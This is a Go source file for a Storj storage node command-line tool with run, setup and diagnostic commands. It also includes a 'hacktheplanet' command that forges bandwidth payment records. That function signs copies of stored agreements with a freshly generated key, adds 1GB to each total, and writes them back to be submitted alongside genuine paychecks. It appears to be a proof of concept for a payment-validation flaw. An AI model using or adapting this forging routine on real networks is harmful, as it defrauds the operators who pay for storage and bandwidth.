// Copyright (C) 2018 Storj Labs, Inc.
// See LICENSE for copying information.

package main

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"text/tabwriter"

	"github.com/gogo/protobuf/proto"
	"github.com/spf13/cobra"
	"go.uber.org/zap"

	"storj.io/storj/internal/fpath"
	"storj.io/storj/pkg/cfgstruct"
	"storj.io/storj/pkg/kademlia"
	"storj.io/storj/pkg/pb"
	"storj.io/storj/pkg/piecestore/psserver"
	"storj.io/storj/pkg/piecestore/psserver/psdb"
	"storj.io/storj/pkg/process"
	"storj.io/storj/pkg/provider"
	"storj.io/storj/pkg/storj"

	"github.com/gtank/cryptopasta"
	"crypto/x509"
	"crypto/ecdsa"
	testidentity "storj.io/storj/internal/identity"
)

var (
	rootCmd = &cobra.Command{
		Use:   "storagenode",
		Short: "StorageNode",
	}
	runCmd = &cobra.Command{
		Use:   "run",
		Short: "Run the storagenode",
		RunE:  cmdRun,
	}
	setupCmd = &cobra.Command{
		Use:         "setup",
		Short:       "Create config files",
		RunE:        cmdSetup,
		Annotations: map[string]string{"type": "setup"},
	}
	diagCmd = &cobra.Command{
		Use:   "diag",
		Short: "Diagnostic Tool support",
		RunE:  cmdDiag,
	}
	hackCmd = &cobra.Command{
		Use:   "hacktheplanet",
		Short: "Manipulate the storagenode. Hack the planet.",
		RunE:  cmdHack,
	}

	runCfg struct {
		Identity provider.IdentityConfig
		Kademlia kademlia.Config
		Storage  psserver.Config
	}
	setupCfg struct {
		CA        provider.CASetupConfig
		Identity  provider.IdentitySetupConfig
		Overwrite bool `default:"false" help:"whether to overwrite pre-existing configuration files"`
	}
	diagCfg struct {
	}

	defaultConfDir string
	defaultDiagDir string
	confDir        *string
)

const (
	defaultServerAddr    = ":28967"
	defaultSatteliteAddr = "127.0.0.1:7778"
)

func init() {
	defaultConfDir = fpath.ApplicationDir("storj", "storagenode")

	dirParam := cfgstruct.FindConfigDirParam()
	if dirParam != "" {
		defaultConfDir = dirParam
	}

	confDir = rootCmd.PersistentFlags().String("config-dir", defaultConfDir, "main directory for storagenode configuration")

	defaultDiagDir = filepath.Join(defaultConfDir, "storage")
	rootCmd.AddCommand(runCmd)
	rootCmd.AddCommand(setupCmd)
	rootCmd.AddCommand(diagCmd)
	rootCmd.AddCommand(hackCmd)
	cfgstruct.Bind(runCmd.Flags(), &runCfg, cfgstruct.ConfDir(defaultConfDir))
	cfgstruct.Bind(setupCmd.Flags(), &setupCfg, cfgstruct.ConfDir(defaultConfDir))
	cfgstruct.Bind(diagCmd.Flags(), &diagCfg, cfgstruct.ConfDir(defaultDiagDir))
	cfgstruct.Bind(hackCmd.Flags(), &diagCfg, cfgstruct.ConfDir(defaultDiagDir))
}

func cmdRun(cmd *cobra.Command, args []string) (err error) {
	farmerConfig := runCfg.Kademlia.Farmer
	if err := isFarmerEmailValid(farmerConfig.Email); err != nil {
		zap.S().Warn(err)
	} else {
		zap.S().Info("Farmer email: ", farmerConfig.Email)
	}
	if err := isFarmerWalletValid(farmerConfig.Wallet); err != nil {
		zap.S().Fatal(err)
	} else {
		zap.S().Info("Farmer wallet: ", farmerConfig.Wallet)
	}

	return runCfg.Identity.Run(process.Ctx(cmd), nil, runCfg.Kademlia, runCfg.Storage)
}

func cmdSetup(cmd *cobra.Command, args []string) (err error) {
	setupDir, err := filepath.Abs(*confDir)
	if err != nil {
		return err
	}

	valid, err := fpath.IsValidSetupDir(setupDir)
	if !setupCfg.Overwrite && !valid {
		return fmt.Errorf("storagenode configuration already exists (%v). Rerun with --overwrite", setupDir)
	} else if setupCfg.Overwrite && err == nil {
		fmt.Println("overwriting existing satellite config")
		err = os.RemoveAll(setupDir)
		if err != nil {
			return err
		}
	}

	err = os.MkdirAll(setupDir, 0700)
	if err != nil {
		return err
	}

	setupCfg.CA.CertPath = filepath.Join(setupDir, "ca.cert")
	setupCfg.CA.KeyPath = filepath.Join(setupDir, "ca.key")
	setupCfg.Identity.CertPath = filepath.Join(setupDir, "identity.cert")
	setupCfg.Identity.KeyPath = filepath.Join(setupDir, "identity.key")

	err = provider.SetupIdentity(process.Ctx(cmd), setupCfg.CA, setupCfg.Identity)
	if err != nil {
		return err
	}

	overrides := map[string]interface{}{
		"identity.cert-path":                      setupCfg.Identity.CertPath,
		"identity.key-path":                       setupCfg.Identity.KeyPath,
		"identity.server.address":                 defaultServerAddr,
		"storage.path":                            filepath.Join(setupDir, "storage"),
		"kademlia.bootstrap-addr":                 defaultSatteliteAddr,
		"piecestore.agreementsender.overlay-addr": defaultSatteliteAddr,
	}

	return process.SaveConfig(runCmd.Flags(), filepath.Join(setupDir, "config.yaml"), overrides)
}

func cmdHack(cmd *cobra.Command, args []string) (err error) {
	diagDir, err := filepath.Abs(*confDir)
	if err != nil {
		return err
	}

	// check if the directory exists
	_, err = os.Stat(diagDir)
	if err != nil {
		fmt.Println("Storagenode directory doesn't exist", diagDir)
		return err
	}

	// open the sql db
	dbpath := filepath.Join(diagDir, "storage", "piecestore.db")
	db, err := psdb.Open(context.Background(), "", dbpath)
	if err != nil {
		fmt.Println("Storagenode database couldnt open:", dbpath)
		return err
	}

	//get all bandwidth aggrements entries already ordered
	bwAgreements, err := db.GetBandwidthAllocations()
	if err != nil {
		fmt.Println("stroage node 'bandwidth_agreements' table read error:", dbpath)
		return err
	}

	for _, rbaVal := range bwAgreements {
		for _, rbaDataVal := range rbaVal {
			// deserializing rbad you get payerbwallocation, total & storage node id
			rbad := &pb.RenterBandwidthAllocation_Data{}
			if err := proto.Unmarshal(rbaDataVal.Agreement, rbad); err != nil {
				return err
			}

			// generate a keypair to sign a manipulated paycheck
			fiS, err := testidentity.NewTestIdentity()
			if err != nil {
				return err
			}
			privatekey := fiS.Key.(*ecdsa.PrivateKey)

			pubkey, err := x509.MarshalPKIXPublicKey(fiS.Leaf.PublicKey.(*ecdsa.PublicKey))
			if err != nil {
				return err
			}

			// Add 1GB to the total size
			uplinkdata, _ := proto.Marshal(
				&pb.RenterBandwidthAllocation_Data{
					PayerAllocation: rbad.GetPayerAllocation(),
					PubKey:          pubkey,
					StorageNodeId:   rbad.StorageNodeId,
					Total:           rbad.Total + 1000000000,
				},
			)

			// sign it
			uplinksignature, err := cryptopasta.Sign(uplinkdata, privatekey)
			if err != nil {
				return err
			}

			// store it in the database and send it next time together with all the other paychecks
			err = db.WriteBandwidthAllocToDB(&pb.RenterBandwidthAllocation{
				Signature: uplinksignature,
				Data:      uplinkdata,
			})
		}
	}
	
	return nil
}

func cmdDiag(cmd *cobra.Command, args []string) (err error) {
	diagDir, err := filepath.Abs(*confDir)
	if err != nil {
		return err
	}

	// check if the directory exists
	_, err = os.Stat(diagDir)
	if err != nil {
		fmt.Println("Storagenode directory doesn't exist", diagDir)
		return err
	}

	// open the sql db
	dbpath := filepath.Join(diagDir, "storage", "piecestore.db")
	db, err := psdb.Open(context.Background(), "", dbpath)
	if err != nil {
		fmt.Println("Storagenode database couldnt open:", dbpath)
		return err
	}

	//get all bandwidth aggrements entries already ordered
	bwAgreements, err := db.GetBandwidthAllocations()
	if err != nil {
		fmt.Println("stroage node 'bandwidth_agreements' table read error:", dbpath)
		return err
	}

	// Agreement is a struct that contains a bandwidth agreement and the associated signature
	type SatelliteSummary struct {
		TotalBytes        int64
		PutActionCount    int64
		GetActionCount    int64
		TotalTransactions int64
		// additional attributes add here ...
	}

	// attributes per satelliteid
	summaries := make(map[storj.NodeID]*SatelliteSummary)
	satelliteIDs := storj.NodeIDList{}

	for _, rbaVal := range bwAgreements {
		for _, rbaDataVal := range rbaVal {
			// deserializing rbad you get payerbwallocation, total & storage node id
			rbad := &pb.RenterBandwidthAllocation_Data{}
			if err := proto.Unmarshal(rbaDataVal.Agreement, rbad); err != nil {
				return err
			}

			// deserializing pbad you get satelliteID, uplinkID, max size, exp, serial# & action
			pbad := &pb.PayerBandwidthAllocation_Data{}
			if err := proto.Unmarshal(rbad.GetPayerAllocation().GetData(), pbad); err != nil {
				return err
			}

			summary, ok := summaries[pbad.SatelliteId]
			if !ok {
				summaries[pbad.SatelliteId] = &SatelliteSummary{}
				satelliteIDs = append(satelliteIDs, pbad.SatelliteId)
				summary = summaries[pbad.SatelliteId]
			}

			// fill the summary info
			summary.TotalBytes += rbad.GetTotal()
			summary.TotalTransactions++
			if pbad.GetAction() == pb.PayerBandwidthAllocation_PUT {
				summary.PutActionCount++
			} else {
				summary.GetActionCount++
			}

		}
	}

	// initialize the table header (fields)
	const padding = 3
	w := tabwriter.NewWriter(os.Stdout, 0, 0, padding, ' ', tabwriter.AlignRight|tabwriter.Debug)
	fmt.Fprintln(w, "SatelliteID\tTotal\t# Of Transactions\tPUT Action\tGET Action\t")

	// populate the row fields
	sort.Sort(satelliteIDs)
	for _, satelliteID := range satelliteIDs {
		summary := summaries[satelliteID]
		fmt.Fprint(w, satelliteID, "\t", summary.TotalBytes, "\t", summary.TotalTransactions, "\t", summary.PutActionCount, "\t", summary.GetActionCount, "\t\n")
	}

	// display the data
	err = w.Flush()
	return err
}

func isFarmerEmailValid(email string) error {
	if email == "" {
		return fmt.Errorf("Farmer mail address isn't specified")
	}
	return nil
}

func isFarmerWalletValid(wallet string) error {
	if wallet == "" {
		return fmt.Errorf("Farmer wallet address isn't specified")
	}
	r := regexp.MustCompile("^0x[a-fA-F0-9]{40}$")
	if match := r.MatchString(wallet); !match {
		return fmt.Errorf("Farmer wallet address isn't valid")
	}
	return nil
}

func main() {
	process.Exec(rootCmd)
}

